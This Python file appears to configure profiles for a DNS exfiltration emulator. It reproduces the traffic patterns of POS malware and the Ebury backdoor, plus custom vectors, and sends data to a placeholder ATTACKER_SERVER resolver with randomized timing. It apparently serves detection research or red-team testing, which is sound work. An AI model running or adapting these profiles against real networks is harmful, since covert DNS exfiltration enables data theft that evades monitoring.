import asyncio
from cryptography.hazmat.primitives.serialization import load_pem_public_key
from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicKey

import tdns.exfil

ATTACKER_SERVER = '' # fill with the attacker's DNS server's IP

NUMBERS_MEANING = """
Profile numbers:
    0: Minute-long exfiltration, set period to 1 second*, to test functionality of the implementation.
    1: Hour-long exfiltration, with random delays. Around 2 seconds period*.
    2: 3-hours-long exfiltration, with random delays. Around 60 seconds period*.

    *: Some vectors use additional messages, their behaviour is not included in these periods.
       Note that in some vectors, 1 message does not include complete data.
"""

# FrameworkPOS profiles ----------------------------------------------

def frameworkpos_0():
    return tdns.exfil.frameworkpos(
        beacon_delay=10, proc_nums=1, amount=60, time=1)


def frameworkpos_1():
    return tdns.exfil.frameworkpos(
        beacon_delay=60, proc_nums=3, time=3600, amount=1800, random_delay=True)


def frameworkpos_2():
    return tdns.exfil.frameworkpos(
        beacon_delay=60, proc_nums=3, time=3600, amount=60, random_delay=True)


# MultigrainPOS profiles ---------------------------------------------


def multigrainpos_0():
    public_key: RSAPublicKey
    with open('client/tdns/public.pem', 'rb') as keyfile:
        public_key = load_pem_public_key(
            keyfile.read()
        )
    return tdns.exfil.multigrainpos(public_key, init_delay=10, amount=60, time=1)


def multigrainpos_1():
    public_key: RSAPublicKey
    with open('client/tdns/public.pem', 'rb') as keyfile:
        public_key = load_pem_public_key(
            keyfile.read()
        )
    return tdns.exfil.multigrainpos(public_key, init_delay=60, amount=1800, time=3600, random_delay=True)


def multigrainpos_2():
    public_key: RSAPublicKey
    with open('client/tdns/public.pem', 'rb') as keyfile:
        public_key = load_pem_public_key(
            keyfile.read()
        )
    return tdns.exfil.multigrainpos(public_key, init_delay=60, amount=60, time=3600, random_delay=True)


# Ebury profiles -----------------------------------------------------


def ebury_0():
    return tdns.exfil.ebury(resolver_addr=ATTACKER_SERVER,
                           amount=60, time=1)


def ebury_1():
    return tdns.exfil.ebury(resolver_addr=ATTACKER_SERVER,
                           amount=1800, time=3600, random_delay=True)


def ebury_2():
    return tdns.exfil.ebury(resolver_addr=ATTACKER_SERVER,
                           amount=60, time=3600, random_delay=True)


# FasterVec profiles -------------------------------------------------


def fastervec_0():
    return tdns.exfil.fastervec(udp=True, amount=60, time=1, resolver_addr=ATTACKER_SERVER)


def fastervec_1():
    return tdns.exfil.fastervec(udp=True, amount=1800, time=3600, subdomain=20, resolver_addr=ATTACKER_SERVER, random_delay=True)


def fastervec_2():
    return tdns.exfil.fastervec(udp=True, amount=60, time=3600, subdomain=20, resolver_addr=ATTACKER_SERVER, random_delay=True)


# Kessel profiles ----------------------------------------------------


def kessel_0():
    return tdns.exfil.kessel(amount=60, time=1)


def kessel_1():
    return tdns.exfil.kessel(amount=1800, time=3600, random_delay=True)


def kessel_2():
    return tdns.exfil.kessel(amount=60, time=3600, random_delay=True)


# StealthyVec profiles -----------------------------------------------


def stealthyvec_0():
    with open('wordlists/domains.txt', 'r') as dom_file:
        domains_list = dom_file.read().splitlines()
    with open('wordlists/words.txt', 'r') as words_file:
        words_list = words_file.read().splitlines()
    return tdns.exfil.stealthyvec(domains=domains_list, words=words_list, levels=3, amount=60, time=1)


def stealthyvec_1():
    with open('wordlists/domains.txt', 'r') as dom_file:
        domains_list = dom_file.read().splitlines()
    with open('wordlists/words.txt', 'r') as words_file:
        words_list = words_file.read().splitlines()
    return tdns.exfil.stealthyvec(domains=domains_list, words=words_list, levels=3, amount=1800, time=3600, random_delay=True)


def stealthyvec_2():
    with open('wordlists/domains.txt', 'r') as dom_file:
        domains_list = dom_file.read().splitlines()
    with open('wordlists/words.txt', 'r') as words_file:
        words_list = words_file.read().splitlines()
    return tdns.exfil.stealthyvec(domains=domains_list, words=words_list, levels=3, amount=60, time=3600, random_delay=True)


# Custom profiles ----------------------------------------------------


def all_0():
    async def wrapper():
        fpos = asyncio.create_task(frameworkpos_0()())
        mpos = asyncio.create_task(multigrainpos_0()())
        ebry = asyncio.create_task(ebury_0()())
        kssl = asyncio.create_task(kessel_0()())
        fvec = asyncio.create_task(fastervec_0()())
        svec = asyncio.create_task(stealthyvec_0()())
        await fpos
        await mpos
        await ebry
        await kssl
        await fvec
        await svec
    return wrapper


def all_1():
    async def wrapper():
        fpos = asyncio.create_task(frameworkpos_1()())
        mpos = asyncio.create_task(multigrainpos_1()())
        ebry = asyncio.create_task(ebury_1()())
        kssl = asyncio.create_task(kessel_1()())
        fvec = asyncio.create_task(fastervec_1()())
        svec = asyncio.create_task(stealthyvec_1()())
        await fpos
        await mpos
        await ebry
        await kssl
        await fvec
        await svec
    return wrapper


def all_2():
    async def wrapper():
        fpos = asyncio.create_task(frameworkpos_2()())
        mpos = asyncio.create_task(multigrainpos_2()())
        ebry = asyncio.create_task(ebury_2()())
        kssl = asyncio.create_task(kessel_2()())
        fvec = asyncio.create_task(fastervec_2()())
        svec = asyncio.create_task(stealthyvec_2()())
        await fpos
        await mpos
        await ebry
        await kssl
        await fvec
        await svec
    return wrapper